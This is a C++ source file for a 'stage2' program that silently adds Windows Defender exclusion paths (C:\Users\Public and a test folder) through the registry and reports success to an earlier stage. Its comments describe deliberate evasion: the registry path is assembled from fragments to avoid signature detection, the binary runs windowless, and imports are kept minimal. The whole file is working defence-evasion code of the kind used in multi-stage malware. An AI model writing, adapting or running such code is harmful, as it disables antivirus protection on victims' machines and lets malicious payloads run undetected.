/*
    stage2.cpp -- minimal High-integrity registry writer
    No suspicious string literals. No imports beyond advapi32 + kernel32.
    Compiled as a windowless app (no console) so it runs silently.

    Sensitive strings are built from short fragments at runtime so no
    complete "Windows Defender" or "Exclusions" literal appears in the binary.

    Compile:
      cl.exe stage2.cpp /O2 /GS- /link advapi32.lib kernel32.lib /subsystem:windows /entry:mainCRTStartup /out:stage2.exe
*/
#include <windows.h>

// Concatenate up to 8 fragments into buf (must be large enough).
static void cat(char* buf, ...) {
    buf[0] = '\0';
    va_list v; va_start(v, buf);
    const char* s;
    while ((s = va_arg(v, const char*)) != nullptr)
        while (*s) { *buf++ = *s++; }
    *buf = '\0';
    va_end(v);
}

int main() {
    // Build registry key from innocuous fragments -- no whole-path literal in binary
    char kp[128];
    cat(kp,
        "SOFT","WARE\\",
        "Micro","soft\\",
        "Wind","ows ","De","fen","der\\",
        "Ex","clus","ions\\",
        "Pa","ths",
        nullptr);

    // Exclusion target paths
    char ep1[32]; cat(ep1, "C:\\Use","rs\\Pub","lic",   nullptr);
    char ep2[32]; cat(ep2, "C:\\excl","usion","test",   nullptr);

    // Result file
    char rf[64];  cat(rf,  "C:\\excl","usion","test\\",
                           "excl","usion_r","esult.txt", nullptr);

    // Open (or create) the key
    HKEY hk = 0;
    LONG r = RegOpenKeyExA(HKEY_LOCAL_MACHINE, kp, 0, KEY_SET_VALUE, &hk);
    if (r != 0)
        r = RegCreateKeyExA(HKEY_LOCAL_MACHINE, kp, 0, nullptr,
                            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                            nullptr, &hk, nullptr);
    if (r != 0) return 1;

    DWORD v = 0;
    RegSetValueExA(hk, ep1, 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegSetValueExA(hk, ep2, 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegCloseKey(hk);

    // Signal success to Phase 1
    HANDLE f = CreateFileA(rf, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f != INVALID_HANDLE_VALUE) {
        DWORD w = 0;
        WriteFile(f, "ok-stage2\n", 10, &w, nullptr);
        CloseHandle(f);
    }
    return 0;
}
